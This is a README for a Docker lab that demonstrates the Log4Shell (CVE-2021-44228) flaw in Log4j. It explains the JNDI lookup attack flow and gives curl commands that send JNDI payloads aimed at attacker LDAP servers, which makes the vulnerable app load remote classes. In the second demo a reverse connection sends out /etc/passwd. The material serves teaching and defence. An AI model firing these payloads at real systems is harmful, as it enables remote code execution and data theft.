# Log4Shell (CVE-2021-44228) — Lab Demo

## Overview

Log4Shell is a critical vulnerability in Log4j, a widely used Java logging library. It allows unauthenticated remote code execution by sending a specially crafted string in any field that the application logs.

---

## Attack Flow

### 1. Attacker Sends Malicious Input

The attacker submits a JNDI lookup string in any logged field (username, search query, User-Agent header, etc.):

```
${jndi:ldap://attacker-server:1389/Exploit}
```

### 2. Application Logs the Input

The vulnerable application passes the string to Log4j:

```java
logger.info("Login attempt for user: " + username);
```

Log4j recognizes the `${}` pattern and interprets it as a lookup expression rather than plain text.

### 3. Log4j Performs the JNDI Lookup

Log4j automatically opens a connection to the attacker's LDAP server and requests the named object (`Exploit`). This is the root of the vulnerability: Log4j should never resolve external references embedded in user input.

### 4. LDAP Server Returns a Remote Reference

The attacker's LDAP server responds with a reference pointing to a remote Java class:

```
http://attacker-server:8888/Exploit.class
```

### 5. Victim Downloads and Executes Malicious Code

The victim's JVM fetches the class file and loads it. Any code in the `static` initializer block runs immediately upon loading:

```java
static {
    Runtime.getRuntime().exec("malicious command");
}
```

---

## Attack Diagram

```
┌─────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   Attacker  │         │ Vulnerable App   │         │ Attacker Server │
│             │         │  (with Log4j)    │         │  (LDAP + HTTP)  │
└─────┬───────┘         └────────┬─────────┘         └────────┬────────┘
      │                          │                             │
      │  1. Send malicious       │                             │
      │     payload              │                             │
      ├─────────────────────────>│                             │
      │  ${jndi:ldap://...}      │                             │
      │                          │                             │
      │                          │  2. Log4j processes         │
      │                          │     JNDI lookup             │
      │                          │                             │
      │                          │  3. Connect to LDAP         │
      │                          ├────────────────────────────>│
      │                          │     "Give me Exploit"       │
      │                          │                             │
      │                          │  4. "Download from HTTP"    │
      │                          │<────────────────────────────┤
      │                          │                             │
      │                          │  5. Download Exploit.class  │
      │                          ├────────────────────────────>│
      │                          │                             │
      │                          │  6. Return malicious code   │
      │                          │<────────────────────────────┤
      │                          │                             │
      │                          │  7. Execute malicious code  │
      │                          │        COMPROMISED!         │
      │                          │                             │
```

---

## Why This Vulnerability Is Severe

- No authentication is required — the payload is a plain text string.
- Any logged field is a potential attack vector: usernames, passwords, HTTP headers, form fields.
- Execution is automatic — no user interaction on the victim side.
- Log4j was present in thousands of applications and frameworks at the time of disclosure.
- The impact is full remote code execution with the privileges of the running process.

---

## Lab Instructions

### Start the Lab

```bash
docker-compose up --build
```

### Demo 1 — Remote Code Execution (file creation)

Send the exploit payload:

```bash
curl -X POST http://localhost:8080/login \
  -d "username=\${jndi:ldap://ldap-server-exploit:1389/Exploit}&password=test"
```

Verify execution on the victim container:

```bash
docker exec web_ssrf-vulnerable-app-1 ls -la /tmp/pwned
```

If the file exists, the malicious class was loaded and executed successfully.

### Demo 2 — Data Exfiltration via Reverse Connection

Send the reverse shell payload:

```bash
curl -X POST http://localhost:8080/login \
  -d "username=\${jndi:ldap://ldap-server-revshell:1390/ReverseShell}&password=test"
```

Verify that the attacker received the exfiltrated data:

```bash
docker exec <attacker-container-name> cat /tmp/received.txt
```

The file will contain the contents of `/etc/passwd` from the victim container, transmitted over the reverse connection.

---

## References

- [NIST NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4Shell Guidance](https://www.cisa.gov/log4j-vulnerability-guidance)